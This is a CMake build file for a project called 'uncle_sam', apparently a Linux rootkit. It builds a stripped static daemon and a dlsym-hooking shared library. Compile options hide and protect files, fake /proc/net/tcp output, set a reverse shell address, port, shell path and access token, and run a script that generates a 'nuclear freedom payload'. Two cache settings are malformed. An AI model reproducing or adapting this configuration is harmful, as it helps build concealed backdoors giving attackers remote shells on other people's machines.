cmake_minimum_required(VERSION 3.10)
project(
    uncle_sam
    VERSION 0.1
    LANGUAGES C CXX
)

option(BUILD_SHARED_LIBS "Build using shared libraries" ON)


add_executable(uncle_sam_daemon src/main.c)
add_library(uncle_sam SHARED src/lib.c src/util.c)

#statically link uncle_sam_daemon
target_compile_options(uncle_sam_daemon PRIVATE -static-libgcc -static-libstdc++ -static)
target_link_options(uncle_sam_daemon PRIVATE -static-libgcc -static-libstdc++ -static)
#link dlsym
target_link_libraries(uncle_sam PRIVATE dl)

#Enable Werr and Wall for both targets
target_compile_options(uncle_sam_daemon PRIVATE -Wall)
target_compile_options(uncle_sam PRIVATE -Wall -Werror)
#enable debug symbols
target_compile_options(uncle_sam_daemon PRIVATE -g)

#options
OPTION(DEBUG "Print debug messages" OFF)
OPTION(PREVENT_LISTING "Prevent listing of files" ON)
OPTION(PREVENT_REMOVAL "Prevent removal of files" ON)
set(REVERSE_SHELL_IP "127.0.0.1")
set(REVERSE_SHELL_PORT 1984)
set(TOKEN "test")
set(FAKE_PROC_NET_TCP_PATH CACHE STRING "/tmp/dbus-aEgRdcC")
set(SHELL_PATH CACHE STRING "/bin/sh")
string(SHA256 secure_hash_token ${TOKEN} )
message("secure_hash_token: ${secure_hash_token}")
set(my_targets uncle_sam_daemon uncle_sam)

find_package(Threads REQUIRED)
foreach(target ${my_targets})
    if(DEBUG)
        target_compile_definitions(${target} PRIVATE DEBUG)
    endif()
    if(PREVENT_LISTING)
        target_compile_definitions(${target} PRIVATE PREVENT_LISTING)
    endif()
    if(PREVENT_REMOVAL)
        target_compile_definitions(${target} PRIVATE PREVENT_REMOVAL)
    endif()
    target_compile_definitions(${target} PRIVATE TOKEN="${secure_hash_token}")
    target_compile_definitions(${target} PRIVATE REVERSE_SHELL_IP="${REVERSE_SHELL_IP}")
    target_compile_definitions(${target} PRIVATE REVERSE_SHELL_PORT=${REVERSE_SHELL_PORT})
    target_compile_definitions(${target} PRIVATE SHELL_PATH="${SHELL_PATH}")


    #optimize for size
    target_compile_options(${target} PRIVATE -Os)
    #strip symbols
    set_target_properties(${target} PROPERTIES LINK_FLAGS "-s")
    #target thread
    target_link_libraries(${target} PRIVATE Threads::Threads)
endforeach()
target_link_libraries(uncle_sam PRIVATE ssl.a)
target_link_libraries(uncle_sam PRIVATE crypto.a)


#add custom target to run generate_payload.sh to make the uncle_sam.run file
add_custom_target(uncle_sam.run ALL
    COMMAND ${CMAKE_CURRENT_LIST_DIR}/generate_payload.sh
    DEPENDS uncle_sam uncle_sam_daemon
    WORKING_DIRECTORY ${CMAKE_CURRENT_LIST_DIR}
    COMMENT "Generating final nuclear freedom payload..."
    VERBATIM )

